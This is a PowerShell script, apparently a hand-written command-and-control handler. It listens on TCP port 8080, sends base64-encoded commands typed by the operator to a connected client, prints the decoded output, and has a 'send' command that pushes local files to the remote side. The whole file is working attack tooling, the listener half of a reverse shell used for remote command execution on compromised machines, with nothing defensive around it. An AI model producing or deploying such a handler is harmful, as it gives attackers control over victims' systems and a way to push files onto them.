
function SendFile($stream,$filename)
{
    Get-ChildItem

    if(Test-Path -Path $filename)
    {
        $FullPath = (Get-ChildItem -Path $filename).FullName ; Write-Host $FullPath
        $FileAsBytes = [System.IO.File]::ReadAllBytes($FullPath)
        Write-Host $FileAsBytes
        $FileAsBytes | %{ $stream.Write($_) }
        WRite-Host "Sent"
        return
    }
    else 
    {
        Write-Host "[!] File not found "
        return    
    }
}
function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "[*]Connection from: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            $bytes = New-Object System.Byte[] 1024

            $encodingScheme = New-Object System.Text.ASCIIEncoding

            while($true)
            {
                #$cmd   = $encodingScheme.GetString($bytes,0,$var)
                $transmitter           = New-Object System.IO.StreamWriter($stream)
                $receiver              = New-Object System.IO.StreamReader($stream)
                $plaintext_cmd         = Read-Host "[*]>>>"
                $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                $cmd                   = [Convert]::ToBase64String($cmd)

                if($cmd)
                {
                    if($plaintext_cmd | Select-String 'exit')
                    {
                        $client.Close()
                        Write-Host "[~] Client connection closed"
                        Write-Host "[~] Returning to main loop"
                        Write-Host "[*] Listening on: $port"
                        $plaintext_cmd         = Read-Host "[*]>>>"
                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd                   = [Convert]::ToBase64String($cmd)
                    }
                    if($plaintext_cmd | Select-String 'send')
                    {
                        $fileName = $plaintext_cmd.Split(' ')[1]
                        Write-Host "Pre function call: $fileName"
                        SendFile $transmitter $fileName
                        $transmitter.Flush()
                        $plaintext_cmd         = Read-Host "[*]>>>"
                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd                   = [Convert]::ToBase64String($cmd)
                    }
                    try
                    {
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush() 
                    }
                    catch
                    {
                        continue
                    }
                }

                $intake      = $receiver.ReadLine()
                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                $response    = $intake

                if($intake)
                {
                    Write-Host $response
                }

            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080